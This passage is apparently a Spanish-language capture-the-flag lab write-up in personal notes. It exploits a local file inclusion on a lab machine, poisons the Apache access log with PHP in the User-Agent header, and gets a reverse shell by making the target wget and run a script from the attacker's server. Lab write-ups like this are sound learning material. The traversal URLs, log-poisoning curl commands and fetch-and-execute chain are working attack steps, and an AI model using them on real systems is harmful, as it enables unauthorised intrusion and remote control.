Hacemos un escaneo con nmap:
![[Pasted image 20230826174126.png]]
Y esta es la página web:
![[Pasted image 20230826174146.png]]
Si hacemos clic en sign up, vemos que se nos cambia la URL donde se llama a un fichero llamado default.php, lo que nos da una pista de un posible local file inclusion:
![[Pasted image 20230826174712.png]]
Hay una herramienta para automatizar ataques de local file inclusion en el siguiente repositorio:
```bash
https://github.com/kvlx-alt/LFI-Scanner
```
![[Pasted image 20230826174740.png]]
La bajamos y probamos:
![[Pasted image 20230826174910.png]]
Y nos pide la url, donde la pegaremos justo en el momento antes que cargue el default.php:
![[Pasted image 20230826174957.png]]
Y vemos que nos pide un diccionario para hacer ataques de fuerza bruta, por lo que nos bajamos uno de github:
```bash
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt
```
![[Pasted image 20230826175150.png]]
![[Pasted image 20230826175235.png]]
Una vez bajado, lo cargamos en la herramienta y nos encuentra el path vulnerable:
![[Pasted image 20230826175312.png]]
```bash
http://192.168.0.42/index.php?page=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
```
Lo pegamos en la web y vemos que funciona:
![[Pasted image 20230826175334.png]]
Lo interesante es que una vez pudiendo ver archivos del sistema, podemos ver también el archivo access.log de apache, por lo que es posible que estemos ante un log poisonning:
```bash
http://192.168.0.42/index.php?page=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/log/apache2/access.log
```
![[Pasted image 20230826175526.png]]
Ejecutamos un comando de forma remota con curl:
```bash
curl -s -X GET 'http://192.168.0.42/' -H "User-Agent: <?php system('whoami'); ?>"
```
Y vemos que se ejecutó correctamente en la máquina víctima:
![[Pasted image 20230828115822.png]]
Por lo que ahora ingresamos código para enviarnos una reverse shell, de tal forma que creamos el script con el payload:
![[Pasted image 20230828120026.png]]
Nos montamos un servidor http con python compartiendo este script:
![[Pasted image 20230828120059.png]]
Y ejecutamos los siguientes comandos:
```python
curl -s -X GET 'http://192.168.0.42' -H "User-Agent: <?php system('wget http://10.8.100.91/pwned.sh'); ?>"

curl -s -X GET 'http://192.168.0.42' -H "User-Agent: <?php system('chmod 777 pwned.sh'); ?>"

curl -s -X GET 'http://192.168.0.42' -H "User-Agent: <?php system('bash pwned.sh'); ?>"
```
Y recibimos la reverse shell:
![[Pasted image 20230828120606.png]]
Una vez dentro, vemos que tenemos 3 carpetas pero no tenemos permiso para acceder a ninguna de ellas:
